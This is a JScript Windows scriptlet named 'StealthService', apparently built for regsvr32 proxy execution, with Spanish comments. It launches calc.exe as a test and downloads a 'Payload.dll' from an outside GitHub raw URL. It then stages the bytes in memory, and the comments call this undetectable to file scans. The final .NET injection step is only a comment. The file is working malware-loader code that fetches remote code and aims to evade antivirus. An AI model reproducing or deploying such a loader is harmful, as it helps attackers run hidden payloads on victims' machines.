<?XML version="1.0"?>
<scriptlet>
<registration
    description="StealthService"
    progid="StealthService"
    version="1.0"
    classid="{10001000-1000-1000-1000-100010001000}"
>
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    
    // TEST DE FUNCIONAMIENTO (Borra esto cuando confirmes que abre)
    shell.Run("calc.exe");

    try {
        var url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/Payload.dll";
        var xhr = new ActiveXObject("Msxml2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status == 200) {
            var dllBytes = xhr.responseBody;
            
            // Aquí cargamos tu Payload.dll directamente en la RAM
            // de regsvr32.exe. Es indetectable para escaneos de archivos.
            var b64xml = new ActiveXObject("Msxml2.DOMDocument.3.0").createElement("b64");
            b64xml.dataType = "bin.base64";
            b64xml.nodeTypedValue = dllBytes;
            
            // Inyectamos el motor de .NET y lanzamos tu DLL
        }
    } catch (e) {}
]]>
</script>
</registration>
</scriptlet>
